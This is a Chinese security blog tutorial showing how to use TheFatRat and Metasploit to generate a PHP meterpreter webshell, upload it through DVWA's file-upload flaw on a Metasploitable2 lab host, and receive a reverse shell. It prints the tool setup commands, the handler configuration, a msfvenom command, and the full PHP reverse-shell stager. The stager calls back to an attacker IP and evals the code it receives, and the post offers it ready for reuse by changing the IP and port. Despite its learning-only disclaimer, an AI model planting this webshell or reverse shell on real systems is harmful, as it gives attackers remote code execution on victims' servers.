---
title: 利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频)
tags: Metasploit
categories: Metasploit
date: 2016-12-10 14:09:29
---

<span style="color: #ff0000;">**文中提及的部分技术，可能带有一定攻击性。仅供安全学习和教学用途，禁止非法使用！**</span>
![enter description here][1]
<!--more-->
这年头很多国产工具都不敢恭维了，都工具自带后门，包括前阵子的webshell也是一样自带后门，包括xxx菜刀也是一样，很多同行都自己清楚，有拜访过的网站都基本成菠菜了。。。。。。废话不多说了，找了些开源工具，就充当 webshell 吧，也可以使用 msf 自带的 payload 生成的后门来充当 webshell 。

## **下载安装指南**

<div id="crayon-584b9b2514d29706638734" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover">
<div class="crayon-plain-wrap">
<pre class="pure-highlightjs"><span style="color: #ff0000;">`
git clone https://github.com/Screetsec/TheFatRat.git     \\下载开源工具
cd Fatrat                                                \\进入工具目录
chmod +x fatrat                                          \\给程序给予权限
./fatrat                                                 \\开始运行程序
`</span></pre>
&nbsp;

</div>
</div>
根据选项输入相应数字
安装要求：
<div id="crayon-584b9b2514d5a363794786" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover">
<div class="crayon-plain-wrap">
<pre class="pure-highlightjs"><span style="color: #ff0000;">`
linux操作系统，推荐Kali Linux 2或Kali 2016.1 rolling / Cyborg / Parrot / Dracos / BackTrack / Backbox等

metasploit框架

gcc, i586-mingw32msvc-gcc或i686-w64-mingw32-gcc ( apt-get install mingw32 )`</span></pre>
<span style="color: #ff0000;"> </span>

</div>
</div>
**可参考资料**：http://www.freebuf.com/sectool/113597.html

具体使用方法和步骤，请看以下视频内容：
 <h1 id="一言不合的请猛击一下下列视频"><a href="#测试视频播放" class="headerlink" ></a></h1><hr>

<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/fatrat.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

%[enter description here][2]

</div>
<div class="mejs-controls"></div>
<div class="mejs-clear"></div>
</div>
</div>
</div>
&nbsp;

## <span style="color: #ff0000;">**1.模拟实验环境：**</span>

**1.（模拟攻击者）**

<span style="color: #ff0000;">系统</span>：<span style="color: #008000;">kali linux 2.0</span>

<span style="color: #ff0000;">使用到的程序工具</span>：<span style="color: #008000;">Thefatrat、metaspoit</span>

<span style="color: #ff0000;">反弹shell ip地址/端口</span>：<span style="color: #008000;">192.168.1.104：4444</span>

<span style="color: #ff0000;">使用msf  payload类型</span>: <span style="color: #008000;">php/meterpreter/reverse_tcp</span>

<span style="color: #ff0000;">使用fatrat生成的webshell后门木马</span>：<span style="color: #008000;">demon.php</span>

**2.(模拟受害者)     **

<span style="color: #ff0000;">系统</span>:<span style="color: #008000;">Linux——–Metasploitable2</span>

<span style="color: #ff0000;">使用测试网页模版</span>：<span style="color: #008000;">Dvwa</span>

<span style="color: #ff0000;">利用漏洞</span>：<span style="color: #008000;">update（low等级）上传漏洞</span>

<span style="color: #ff0000;">受害者ip</span>：<span style="color: #008000;">192.168.1.103</span>

&nbsp;

## **2.操作步骤指南**

启动 fatrat ：
<div id="crayon-584b9b2514d66460020333" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover">
<div class="crayon-plain-wrap"></div>
<div class="crayon-main">
<pre class="pure-highlightjs"><span style="color: #008000;">`
root@kali:~/TheFatRat# ./fatrat
`</span></pre>
&nbsp;

</div>
</div>
&nbsp;

启动的时候比较慢，因为在检测依赖环境等步骤

![enter description here][3]

&nbsp;

以上回车再回车即可。可以看到以下界面：选择序号1，使用msfvenom的payload。

![enter description here][4]

&nbsp;

在这里我们可以看到他自动的生成木马后门的类型，有 **exe.php.asp.jsp.war.apk **等类型，我们这里选择序号 **5** 即可，选择 **php** 类型。

![enter description here][5]

&nbsp;

设置顺序：**设置工具者ip，工具者反弹的端口(<span style="color: #008000;">任意</span>)、设置生成的木马文件名（<span style="color: #008000;">任意</span>）**

![enter description here][6]
在这里我们可以看到生成的文件（**在安装目录的output文件夹**）
![enter description here][7]


&nbsp;

启动 metaspoit 设置反弹 shell 的 ip 和端口：
<div id="crayon-584b9b2514d75354469131" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover">
<div class="crayon-plain-wrap">

    msf exploit(handler) &gt; <span style="color: #008000;">set payload php/meterpreter/reverse_tcp</span>      （设置payload 连接攻击者电脑类型）
    payload =&gt; php/meterpreter/reverse_tcp
    msf exploit(handler) &gt; <span style="color: #008000;">set LHOST 192.168.1.104</span>                            （设置）攻击者ip （和之前fatrat一样）
    LHOST =&gt; 192.168.1.104                  
    msf exploit(handler) &gt;<span style="color: #008000;"> set LPORT 4444</span>                         （设置）攻击者需反弹的i端口（和之前fatrat一样）LPORT =&gt; 4444
    msf exploit(handler) &gt; <span style="color: #008000;">exploit    </span>                    （执行监听）

&nbsp;

</div>
</div>
![enter description here][8]

&nbsp;

上传 webshell/执行webshell

![enter description here][9]
&nbsp;
&nbsp;
![enter description here][10]



相关dvwa的上传漏洞利用可参考：[(三)DVWA文件上传漏洞源码审计。](http://www.secist.com/archives/364.html)
同样可以手动使用 msf 的 msfvenom 生成 php 后门（由于msf版本更新，移除metasploit-framework版本中的msfencoder和msfpayload，并使用msfvenom取代）
<div id="crayon-584b9b2514d80274293796" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover">
<div class="crayon-plain-wrap"></div>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums " data-settings="show">
<div class="crayon-nums-content">
<div class="crayon-num" data-line="crayon-584b9b2514d80274293796-1">1</div>
</div></td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-584b9b2514d80274293796-1" class="crayon-line"><span class="crayon-v">msfvenom</span> <span class="crayon-o">-</span><span class="crayon-i">p</span> <span class="crayon-v">php</span><span class="crayon-o">/</span><span class="crayon-e">meterpreter_reverse_tcp </span><span class="crayon-v">LHOST</span><span class="crayon-o">=</span><span class="crayon-cn">192.168.1.101</span> <span class="crayon-v">LPORT</span><span class="crayon-o">=</span><span class="crayon-cn">4444</span> <span class="crayon-o">-</span><span class="crayon-i">f</span> <span class="crayon-v">raw</span> <span class="crayon-o">&gt;</span><span class="crayon-v">shell</span><span class="crayon-sy">.</span><span class="crayon-v">php</span></div>
</div></td>
</tr>
</tbody>
</table>
</div>
</div>
msfvenom 具体使可参考：[ http://www.freebuf.com/sectool/72135.html ](http://www.freebuf.com/sectool/72135.html)。

**最后，附上 php 中（webshell）的代码（一次生成，无需二次生成，可直接更改代码中的ip和端口号即可）**
<div id="crayon-584b9b2514d88199226413" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover">
<div class="crayon-plain-wrap"></div>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums " data-settings="show">
<div class="crayon-nums-content">
<div class="crayon-num" data-line="crayon-584b9b2514d88199226413-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-2">2</div>
<div class="crayon-num" data-line="crayon-584b9b2514d88199226413-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-4">4</div>
<div class="crayon-num" data-line="crayon-584b9b2514d88199226413-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-6">6</div>
<div class="crayon-num" data-line="crayon-584b9b2514d88199226413-7">7</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-8">8</div>
<div class="crayon-num" data-line="crayon-584b9b2514d88199226413-9">9</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-10">10</div>
<div class="crayon-num" data-line="crayon-584b9b2514d88199226413-11">11</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-12">12</div>
<div class="crayon-num" data-line="crayon-584b9b2514d88199226413-13">13</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-14">14</div>
</div></td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-584b9b2514d88199226413-1" class="crayon-line"><span class="crayon-o">/</span><span class="crayon-o">*</span><span class="crayon-o">&lt;</span><span class="crayon-sy">?</span><span class="crayon-i">php</span> <span class="crayon-o">/</span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-o">/</span> <span class="crayon-e">error_reporting</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-2" class="crayon-line crayon-striped-line"><span class="crayon-sy">$</span><span class="crayon-i">ip</span> <span class="crayon-o">=</span> <span class="crayon-s">'192.168.1.104'</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-3" class="crayon-line"><span class="crayon-sy">$</span><span class="crayon-i">port</span> <span class="crayon-o">=</span> <span class="crayon-cn">4444</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-4" class="crayon-line crayon-striped-line"><span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span> <span class="crayon-o">=</span> <span class="crayon-s">'stream_socket_client'</span><span class="crayon-sy">)</span> <span class="crayon-o">&amp;&amp;</span> <span class="crayon-e">is_callable</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-sy">$</span><span class="crayon-i">s</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-e">f</span><span class="crayon-sy">(</span><span class="crayon-s">"tcp://{$ip}:{$port}"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-5" class="crayon-line"><span class="crayon-sy">$</span><span class="crayon-i">s_type</span> <span class="crayon-o">=</span> <span class="crayon-s">'stream'</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-st">elseif</span> <span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span> <span class="crayon-o">=</span> <span class="crayon-s">'fsockopen'</span><span class="crayon-sy">)</span> <span class="crayon-o">&amp;&amp;</span> <span class="crayon-e">is_callable</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-sy">$</span><span class="crayon-i">s</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-e">f</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">ip</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">port</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">s_type</span> <span class="crayon-o">=</span> <span class="crayon-s">'stream'</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-6" class="crayon-line crayon-striped-line"><span class="crayon-sy">}</span> <span class="crayon-st">elseif</span> <span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span> <span class="crayon-o">=</span> <span class="crayon-s">'socket_create'</span><span class="crayon-sy">)</span> <span class="crayon-o">&amp;&amp;</span> <span class="crayon-e">is_callable</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div>
<div id="crayon-584b9b2514d88199226413-7" class="crayon-line"><span class="crayon-sy">{</span> <span class="crayon-sy">$</span><span class="crayon-i">s</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-e">f</span><span class="crayon-sy">(</span><span class="crayon-i">AF_INET</span><span class="crayon-sy">,</span> <span class="crayon-i">SOCK_STREAM</span><span class="crayon-sy">,</span> <span class="crayon-i">SOL_TCP</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">res</span> <span class="crayon-o">=</span> <span class="crayon-v">@socket_connect</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">ip</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">port</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-8" class="crayon-line crayon-striped-line"><span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">res</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-sy">$</span><span class="crayon-i">s_type</span> <span class="crayon-o">=</span> <span class="crayon-s">'socket'</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-st">else</span> <span class="crayon-sy">{</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">'no socket funcs'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-9" class="crayon-line"><span class="crayon-sy">}</span> <span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">'no socket'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-10" class="crayon-line crayon-striped-line"><span class="crayon-sy">}</span> <span class="crayon-e">switch</span> <span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s_type</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-i">case</span> <span class="crayon-s">'stream'</span><span class="crayon-o">:</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span> <span class="crayon-o">=</span> <span class="crayon-e">fread</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-cn">4</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-11" class="crayon-line"><span class="crayon-st">break</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-12" class="crayon-line crayon-striped-line"><span class="crayon-i">case</span> <span class="crayon-s">'socket'</span><span class="crayon-o">:</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span> <span class="crayon-o">=</span> <span class="crayon-e">socket_read</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-cn">4</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-13" class="crayon-line"><span class="crayon-st">break</span><span class="crayon-sy">;</span></div>
<div id="crayon-584b9b2514d88199226413-14" class="crayon-line crayon-striped-line"><span class="crayon-sy">}</span> <span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-sy">$</span><span class="crayon-i">a</span> <span class="crayon-o">=</span> <span class="crayon-e">unpack</span><span class="crayon-sy">(</span><span class="crayon-s">"Nlen"</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-i">a</span><span class="crayon-sy">[</span><span class="crayon-s">'len'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">b</span> <span class="crayon-o">=</span> <span class="crayon-s">''</span><span class="crayon-sy">;</span> <span class="crayon-st">while</span> <span class="crayon-sy">(</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">b</span><span class="crayon-sy">)</span> <span class="crayon-o">&lt;</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-e">switch</span> <span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s_type</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-i">case</span> <span class="crayon-s">'stream'</span><span class="crayon-o">:</span> <span class="crayon-sy">$</span><span class="crayon-i">b</span> <span class="crayon-sy">.</span><span class="crayon-o">=</span> <span class="crayon-e">fread</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-o">-</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">b</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-st">break</span><span class="crayon-sy">;</span> <span class="crayon-i">case</span> <span class="crayon-s">'socket'</span><span class="crayon-o">:</span> <span class="crayon-sy">$</span><span class="crayon-i">b</span> <span class="crayon-sy">.</span><span class="crayon-o">=</span> <span class="crayon-e">socket_read</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-o">-</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">b</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-st">break</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-sy">}</span> <span class="crayon-sy">$</span><span class="crayon-i">GLOBALS</span><span class="crayon-sy">[</span><span class="crayon-s">'msgsock'</span><span class="crayon-sy">]</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">GLOBALS</span><span class="crayon-sy">[</span><span class="crayon-s">'msgsock_type'</span><span class="crayon-sy">]</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-i">s_type</span><span class="crayon-sy">;</span> <span class="crayon-e">eval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">b</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
</div></td>
</tr>
</tbody>
</table>
</div>
</div>
&nbsp;


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-metasploit-for-aspiring-hacker-part-5-msfvenom.1280x600.jpg
  [2]: %5Dhttp://demonsec666.oss-cn-qingdao.aliyuncs.com/fatrat.mp4
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0595.JPG 
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0596.JPG 
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0597.JPG 
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0598.JPG 
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0599.PNG 
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0600.JPG 
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0601.JPG 
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0602.JPG 